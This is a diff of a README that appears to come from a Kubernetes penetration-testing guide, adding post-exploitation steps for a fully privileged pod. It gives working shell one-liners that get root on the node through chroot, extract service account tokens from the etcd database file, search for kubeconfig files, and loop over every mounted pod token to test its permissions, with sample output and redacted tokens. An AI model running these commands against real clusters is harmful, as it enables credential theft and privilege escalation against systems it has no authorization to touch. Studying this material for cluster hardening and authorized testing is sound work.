@@ -103,9 +103,9 @@ kubectl delete cronjob everything-allowed-exec-cronjob
 
 # Post exploitation
 
-The pod you create mounts the host’s filesystem to the pod. You’ll have the best luck if you can schedule your pod on a control-plane node using the nodeName selector in your manifest. You then exec into your pod and chroot to the directory where you mounted the host’s filesystem. You now have root on the node running your pod. 
-* **Read secrets from etcd** – If you can run your pod on a control-plane node using the nodeName selector in the pod spec, you might have easy access to the etcd database, which contains all of the configuration for the cluster, including all secrets. 
-* **Hunt for privileged service account tokens**  - Even if you can only schedule your pod on the worker node, you can also access any secret mounted within any pod on the node you are on.  In a production cluster, even on a worker node, there is usually at least one pod that has a token mounted that is bound to a service account that is bound to a clusterrolebinding, that gives you access to do things like create pods or view secrets in all namespaces. 
+The pod has you created mounts the host’s filesystem to the pod, and gives you access to all of the host's namespaces and capabilites. You then exec into your pod and chroot to the directory where you mounted the host’s filesystem. You now have root on the node running your pod. 
+
+
 
 ## Can you run your pod on a control-plane node
 The pod you created above was likely scheduled on a worker node. Before jumping into post exploitation on the worker node, it is worth seeing if you run your a pod on a control-plane node. If you can run your pod on a control-plane node using the nodeName selector in the pod spec, you might have easy access to the etcd database, which contains all of the configuration for the cluster, including all secrets. This is not a possible on cloud managed Kuberntes clusters like GKE and EKS - they hide the control-plane. 
@@ -129,11 +129,44 @@ kubectl apply -f manifests/everything-allowed/job/everything-allowed-exec-job.ya
 
 TODO - show how to get secrets from etcd
 
+## Read secrets from etcd
+If you can run your pod on a control-plane node using the `nodeName` selector in the pod spec, you might have easy access to the `etcd` database, which contains all of the configuration for the cluster, including all secrets. 
 
-Here are some next steps: 
+Below is a quick and dirty way to grab secrets from `etcd` if it is running on the control-plane node you are on. If you want a more elegent solution that spins up a pod with the `etcd` client utility `etcdctl` and uses the control-plane node's credentials to connect to etcd wherever it is running, check out [this example manifest](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) from @mauilion. 
+
+Check to see if `etcd` is running on the control-plane node and see where the database is (This is on a `kubeadm` created cluster)
+```
+root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
+```
+Output:
+```
+data-dir=/var/lib/etcd
+```
+View the data in etcd database:
+```
+strings /var/lib/etcd/member/snap/db | less
+```
+
+Extract the tokens from the database and show the service account name
+```
+db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
+```
+
+Same command, but some greps to only return the default token in the kube-system namespace
+```
+db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
+```
+Output:
+```
+1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
+```
+
+
+* **Hunt for privileged service account tokens**  - Even if you can only schedule your pod on the worker node, you can also access any secret mounted within any pod on the node you are on.  In a production cluster, even on a worker node, there is usually at least one pod that has a token mounted that is bound to a service account that is bound to a clusterrolebinding, that gives you access to do things like create pods or view secrets in all namespaces. 
 
 ## Look for kubeconfig's in the host filesystem 
-If you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)
+
+By default, nodes don't have `kubectl` installed. If you are lucky though, an administrator tried to make their life (and yours) a little easier by installing `kubectl` and their highly privleged credentails on the node. We're not so lucky on this GKE node, but 
 
 ```bash
 find / -name kubeconfig
@@ -152,7 +185,30 @@ find / -name kubeconfig
 ```
 
 ## Grab all tokens from all pods on the system
+Even if you can only schedule your pod on the worker node, you can also access any secret mounted within any pod on the node you are on.  In a production cluster, even on a worker node, there is usually at least one pod that has a token mounted that is bound to a service account that is bound to a clusterrolebinding, that gives you access to do things like create pods or view secrets in all namespaces. 
+
 Use something like access-matrix to see if any of them give you more permission than you currently have. Look for tokens that have permissions to get secrets in kube-system
+
+```
+tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/lib/kubelet/pods/ -name token -type l`; for filename in $tokens; do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; echo "$filename_clean"; tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host cat $filename_clean`; kubectl --token=$tokena auth can-i get pods; done
+
+/var/lib/kubelet/pods/ed980733-45c9-474b-b63e-17cad419460c/volumes/kubernetes.io~secret/kube-proxy-token-9sl2q/token
+no
+/var/lib/kubelet/pods/ad9ee7c8-1dfd-4e73-82a2-8b0810d2694e/volumes/kubernetes.io~secret/aws-node-token-lk4gr/token
+no
+/var/lib/kubelet/pods/ad9ee7c8-1dfd-4e73-82a2-8b0810d2694e/volumes/kubernetes.io~projected/aws-iam-token/token
+error: You must be logged in to the server (Unauthorized)
+/var/lib/kubelet/pods/71c8baeb-fbf9-4f96-8cc6-d1eb7f6d90e7/volumes/kubernetes.io~secret/coredns-token-v852l/token
+no
+/var/lib/kubelet/pods/37b9b872-7ae9-4afb-b631-4b43ed8c4e9c/volumes/kubernetes.io~secret/default-token-wt7v4/token
+no
+/var/lib/kubelet/pods/9c4cc997-d1ab-49d0-a20a-e022f72c5023/volumes/kubernetes.io~secret/coredns-token-v852l/token
+no
+/var/lib/kubelet/pods/cb881dc4-9390-4b44-be7c-c87c757b363c/volumes/kubernetes.io~secret/default-token-wt7v4/token
+no
+```
+
+
 
 ```bash
 # This lists the location of every service account used by every pod on the node you are on, and tells you the namespace. 
